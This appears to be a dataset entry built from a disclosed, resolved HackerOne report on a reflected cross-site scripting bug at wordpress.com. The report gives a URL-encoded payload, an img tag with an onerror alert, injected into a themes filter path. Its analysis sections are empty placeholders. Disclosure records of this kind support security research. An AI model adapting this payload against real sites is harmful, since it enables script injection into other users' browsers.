---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '111500'
original_report_id: '111500'
title: XSS at wordpress.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: automattic
created_at: '2016-01-19T01:28:22.074Z'
disclosed_at: '2016-02-18T04:45:29.146Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS at wordpress.com

## Metadata

- HackerOne Report ID: 111500
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: automattic
- Disclosed At: 2016-02-18T04:45:29.146Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

1) Using Firefox, visit the link: https://wordpress.com/themes/filter/blog/type/%22%3E%3Cimg%20src=a%20onerror=alert%28document.domain%29%3E
2) alert is shown.

Screenshot is attached

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
